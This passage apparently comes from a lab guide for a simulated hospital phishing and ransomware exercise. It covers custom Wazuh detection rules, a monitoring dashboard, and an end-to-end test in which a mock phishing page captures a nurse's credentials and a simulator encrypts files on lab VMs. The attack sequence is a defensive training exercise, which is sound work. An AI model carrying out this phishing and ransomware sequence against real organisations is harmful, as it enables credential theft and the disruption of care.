sudo cp ~/ocblue_trusted_smb_sources /var/www/html/
 
# On Wazuh VM — download and install:
curl http://192.168.0.218/ocblue_suspicious_destinations -o /var/ossec/etc/lists/ocblue_suspicious_destinations
curl http://192.168.0.218/ocblue_trusted_smb_sources -o /var/ossec/etc/lists/ocblue_trusted_smb_sources
chown root:wazuh /var/ossec/etc/lists/ocblue_*
chmod 660 /var/ossec/etc/lists/ocblue_*
 
# Register in /var/ossec/etc/ossec.conf under <ruleset>:
# <list>etc/lists/ocblue_suspicious_destinations</list>
# <list>etc/lists/ocblue_trusted_smb_sources</list>
 
systemctl restart wazuh-manager

◆ Expected Outcome
cat /var/ossec/etc/lists/ocblue_suspicious_destinations shows 192.168.0.218:simulated-phishing-portal. Wazuh manager restarts successfully.
📷  SCREENSHOT
Show cat output of both CDB list files on the Wazuh VM
[ _________________________________ paste screenshot here _________________________________ ]






P11
PHASE 11: CUSTOM WAZUH DETECTION RULES


Step 1
Deploy all 18 custom detection rules
◆ Description
All 18 custom rules are written in a single file on Kali and pushed to Wazuh via Apache. The rules cover every phase of the attack chain from phishing to ransomware impact.
◆ Commands / Details
# Edit rules on Kali:
nano ~/local_rules.xml
 
# Push to Apache:
sudo cp ~/local_rules.xml /var/www/html/local_rules.xml
 
# On Wazuh VM — download and install:
curl http://192.168.0.218/local_rules.xml -o /var/ossec/etc/rules/local_rules.xml
 
# Validate — MUST return no output (no errors):
/var/ossec/bin/wazuh-analysisd -t
 
# Restart manager:
systemctl restart wazuh-manager

◆ Expected Outcome
/var/ossec/bin/wazuh-analysisd -t returns NO output (silence = success). Manager restarts and shows active status.
◆ Notes / Troubleshooting
Common errors:
• 'Signature not found' — parent rule ID doesn't exist or wrong order
• 'Field srcip is static' — remove $(srcip) from rule description
• 'Invalid rule id' — IDs must be integers only, max 6 digits
• 'Invalid attribute' — check frequency/timeframe syntax

📷  SCREENSHOT
Show wazuh-analysisd -t completing with no output
[ _________________________________ paste screenshot here _________________________________ ]


Step 2
Key rules reference — 18 custom rules summary
◆ Description
Complete reference of all detection rules written for this project.
◆ Commands / Details
Rule 102  Level 4  — SMB Network Logon Detected (Event 4624 LogonType 3)
Rule 106  Level 15 — .locked File Rename via FIM (CRITICAL)
Rule 107  Level 15 — Ransom Note File Dropped via FIM (CRITICAL)
Rule 108  Level 15 — Full Attack Chain Confirmed (CRITICAL)
Rule 112  Level 10 — After Hours SMB Logon (11pm-6am)
Rule 113  Level 15 — Mass Encryption: 2+ files in 120s (CRITICAL)
Rule 100  Level 6  — Phishing Portal Accessed
Rule 101  Level 12 — Credentials Submitted to Phishing Portal
Rule 103  Level 2  — Port Scan Seed (no_log, Event 5152)
Rule 104  Level 12 — File Access After Suspicious Logon
Rule 105  Level 8  — Failed SMB Authentication (Event 4625)
Rule 109  Level 5  — Phishing Page Opened (GET email.html)
Rule 110  Level 10 — Brute Force SMB: 5 failed logons in 60s
Rule 111  Level 12 — Ransom Note Accessed (Event 4663)
Rule 10200 Level 0 — Whitelist Known Good IP (suppress 192.168.0.236)
Rule 10301 Level 10— Multi-Port Scan Detected (40 probes in 5s)
Rule 100100 Level 7 — Patient Record File Access (Event 4663)
Rule 100101 Level 8 — Operation Code Blue: Remote SMB Access (Event 5145)
 
SOC Queue filter: rule.groups:soc_queue

◆ Expected Outcome
All critical rules (106, 107, 108, 113) fire during the ransomware simulation. Rule 112 fires during after-hours testing.
◆ Notes / Troubleshooting
Rule 108 must use simple if_matched_sid with NO field conditions — adding field conditions prevents it from firing.

📷  SCREENSHOT
Show grep output from alerts.log showing multiple rules firing during a test run
[ _________________________________ paste screenshot here _________________________________ ]






P12
PHASE 12: CYBERLAB SECURITY MONITOR DASHBOARD


Step 1
Build the 9-panel CYBERLAB Security Monitor dashboard
◆ Description
The custom Wazuh dashboard is the defender's view of the attack — 9 panels showing everything from SMB logon counts to mass encryption alerts. Set time range to Last 15 minutes before the demo.
◆ Commands / Details
# Dashboard → Dashboards → Create new
# Name: CYBERLAB Security Monitor
# Index: wazuh-alerts*
 
# Panel 1 — Ransomware Events (Metric)
#   DQL: rule.id:106 OR rule.id:107
 
# Panel 2 — Alerts Over Time (Bar chart, no filter)
 
# Panel 3 — Rule Groups (Pie chart, no filter)
 
# Panel 4 — Top Rules Table (Data table, no filter)
 
# Panel 5 — After Hours Logon (Metric)
#   DQL: rule.id:112
 
# Panel 6 — Mass Encryption (Metric)
#   DQL: rule.id:113
 
# Panel 7 — Operation Code Blue (Metric)
#   DQL: rule.id:100101
 
# Panel 8 — Full Attack Chain (Metric)
#   DQL: rule.id:108
 
# Panel 9 — SMB Logon Count (Metric)
#   DQL: data.win.system.eventID:4624
 
# Before demo: set time range to Last 15 minutes

◆ Expected Outcome
Dashboard shows 9 panels. After running the attack simulation, all panels update with alert counts.
◆ Notes / Troubleshooting
If panels show 0 — remove any agent.name filters. Set time range to Last 15 minutes. Run attack simulation to generate events.

📷  SCREENSHOT
Show CYBERLAB Security Monitor dashboard with all 9 panels populated after a simulation run
[ _________________________________ paste screenshot here _________________________________ ]


Step 2
Create SOC analyst queue saved search
◆ Description
The SOC queue filters alerts to only the high-priority, actionable events — removing the background noise so an analyst can focus on what matters.
◆ Commands / Details
# Dashboard → Threat Hunting → Events
# Search bar: rule.groups:soc_queue
# Time range: Last 15 minutes
# Sort: Newest first
 
# Save as: "Operation Code Blue - SOC Queue"
 
# Rules that appear in SOC queue:
# Rule 106  — .locked rename (CRITICAL)
# Rule 107  — Ransom note drop (CRITICAL)
# Rule 108  — Full attack chain (CRITICAL)
# Rule 113  — Mass encryption (CRITICAL)
# Rule 100101 — Code Blue SMB (HIGH)

◆ Expected Outcome
Saved search 'Operation Code Blue - SOC Queue' filters to only the 5 high-priority rules. Background noise excluded.
📷  SCREENSHOT
Show SOC queue filtered view showing only high-priority alerts
[ _________________________________ paste screenshot here _________________________________ ]






P13
PHASE 13: FINAL VERIFICATION — COMPLETE SYSTEM TEST


Step 1
Final full clean run — verify everything works end to end
◆ Description
A complete clean run from scratch verifying every component works together. This should be done at least once before the actual presentation.
◆ Commands / Details
# RESET (run first):
> /var/www/logs/creds.txt
> /var/www/logs/access.log
sudo python3 /opt/ransomware-sim/ransomware_sim.py --restore
# Restore Windows demo files on both VMs
 
# START:
# Terminal 1: tail -f /var/www/logs/creds.txt
# Terminal 2: sudo bash /opt/ransomware-sim/watcher.sh
# Terminal 3: tail -f /var/ossec/logs/alerts/alerts.log
# Browser: https://192.168.0.177/app/dashboards (CYBERLAB dashboard, Last 15 min)
 
# RUN:
# 1. Open http://stherashospital.org/email.html on nurse browser
# 2. Click Verify → enter n.rivera / Summer2026! → Submit
# 3. Confirm creds appear in Terminal 1
# 4. Confirm watcher fires in Terminal 2
# 5. Confirm demo files locked on both VMs
# 6. Confirm portal unreachable after 10 seconds
# 7. Confirm Wazuh alerts in Terminal 3
# 8. Confirm dashboard panels updated

◆ Expected Outcome
All components verify: credential capture ✓, watcher fires ✓, both VMs locked ✓, ransom notes delivered ✓, portal dark ✓, Wazuh alerts firing ✓, dashboard updated ✓
◆ Notes / Troubleshooting
Run this complete test the day before the presentation. Note any issues and resolve them before presentation day.

📷  SCREENSHOT
Show complete attack results: locked files on both VMs, Wazuh dashboard with all panels, and watcher log showing execution
[ _________________________________ paste screenshot here _________________________________ ]





